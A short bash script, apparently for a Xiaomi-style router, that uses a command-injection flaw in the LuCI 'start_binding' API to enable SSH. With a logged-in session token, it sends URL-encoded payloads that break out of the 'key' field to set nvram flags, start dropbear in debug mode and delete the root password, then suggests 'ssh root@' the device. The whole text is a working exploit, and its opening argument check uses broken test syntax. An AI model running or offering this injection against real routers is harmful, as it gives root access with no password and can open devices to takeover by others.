#!/bin/bash

if [ "$1" = "" || "$2" = "" ]; then
  echo "Usage: $0 [ip] [stok]"
  echo "e.g. $0 192.168.31.1 e6ea114ba2cddb0c70fbbc417bb2706c"
  echo "Copy the stok-string from a browser's URL-line, while being logged in to the router"
  exit 1
fi

curl -X POST "http://${1}/cgi-bin/luci/;stok=${2}/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'"
sleep 1
curl -X POST "http://${1}/cgi-bin/luci/;stok=${2}/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Anvram%20commit'"
sleep 1
curl -X POST "http://${1}/cgi-bin/luci/;stok=${2}/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'"
sleep 1
curl -X POST "http://${1}/cgi-bin/luci/;stok=${2}/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'"
sleep 1
curl -X POST "http://${1}/cgi-bin/luci/;stok=${2}/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Apasswd%20-d%20root%0A'"

echo
echo "Voila! SSH should be now enabled!"
echo "Try this: 'ssh root@${1}'"
echo

